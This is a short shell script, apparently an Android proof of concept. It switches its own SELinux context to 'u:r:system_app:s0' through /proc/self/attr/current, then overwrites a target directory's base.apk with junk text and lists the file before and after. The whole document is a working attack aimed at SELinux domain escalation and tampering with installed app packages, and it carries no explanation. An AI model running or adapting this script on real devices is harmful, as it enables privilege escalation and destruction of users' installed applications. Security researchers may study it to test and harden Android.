#!/bin/sh
echo -n 'u:r:system_app:s0' > /proc/self/attr/current
cd $1
ls -l base.apk
echo aaa > base.apk
ls -l base.apk
